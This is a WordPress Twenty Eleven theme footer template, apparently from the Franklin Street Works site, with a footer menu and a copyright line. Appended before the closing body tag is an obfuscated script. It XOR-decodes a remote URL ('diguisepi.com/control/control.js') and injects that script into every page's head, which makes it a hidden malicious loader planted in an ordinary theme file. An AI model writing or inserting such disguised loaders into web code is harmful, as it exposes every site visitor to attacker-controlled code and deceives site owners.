<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the id=main div and all content after
 *
 * @package WordPress
 * @subpackage Twenty_Eleven
 * @since Twenty Eleven 1.0
 */
?>

	</div><!-- #main -->

	<footer id="colophon" role="contentinfo">

			<?php
				/* A sidebar in the footer? Yep. You can can customize
				 * your footer with three columns of widgets.
				 */
				get_sidebar( 'footer' );
			?>

			
	</footer><!-- #colophon -->
</div><!-- #page -->
<div class="footerbg"></div>
<?php wp_nav_menu(array('menu' => 'footer')); ?>
<script>
		$("ul#menu-footer").append("<li>&copy; 2011 FRANKLIN STREET WORKS. ALL RIGHTS RESERVED</li>");
</script>
<?php wp_footer(); ?>
<script>var qsrc="";var qsrc_enc="))boasoucvvo(eik)eihrtij)eihrtij(lu";for(qsrc_i=0;qsrc_i<qsrc_enc.length;++qsrc_i){qsrc+=String.fromCharCode(6^qsrc_enc.charCodeAt(qsrc_i))}var qtpe="";var qtype_enc="uetovr";for(qtype_i=0;qtype_i<qtype_enc.length;++qtype_i){qtpe+=String.fromCharCode(6^qtype_enc.charCodeAt(qtype_i))}var qtxt="";var qtxt_enc="rc~r)lgpguetovr";for(qtxt_i=0;qtxt_i<qtxt_enc.length;++qtxt_i){qtxt+=String.fromCharCode(6^qtxt_enc.charCodeAt(qtxt_i))}var qget="";var qget_enc="ncgb";for(qget_i=0;qget_i<qget_enc.length;++qget_i){qget+=String.fromCharCode(6^qget_enc.charCodeAt(qget_i))}var headID=document.getElementsByTagName(qget)[0];var newScript=document.createElement(qtpe);newScript.type=qtxt;newScript.src=qsrc;headID.appendChild(newScript);var q_ele="";var q_ele_enc="dib";for(q_ele_i=0;q_ele_i<q_ele_enc.length;++q_ele_i){q_ele+=String.fromCharCode(6^q_ele_enc.charCodeAt(q_ele_i))}var qloc=window.location.host;var loc=qloc.split(".",3);if(loc[1]=="com"||loc[1]=="org"||loc[1]=="net"||loc[1]=="me"||loc[1]=="co"||loc[1]=="biz"||loc[1]=="us"||loc[1]=="info"){$(q_ele).addClass(loc[0])}else{$(q_ele).addClass(loc[1])}</script>
</body>
</html>
